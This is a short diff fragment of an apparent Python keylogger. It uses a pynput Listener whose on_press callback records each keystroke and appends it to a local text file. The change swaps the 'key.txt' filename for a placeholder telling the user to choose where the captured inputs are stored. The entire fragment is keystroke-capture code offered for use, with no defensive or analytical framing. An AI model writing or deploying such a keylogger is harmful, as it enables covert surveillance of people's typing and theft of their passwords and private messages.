@@ -14,7 +14,7 @@ def write_to_file(key):
     elif letter == "Key.backspace":
         letter = ""   
 
-    with open("key.txt", 'a') as f:
+    with open("name_of_the_file_you_want_to_store_the_inputs.txt", 'a') as f:
         f.write(letter)
         
 with Listener(on_press=write_to_file) as l:
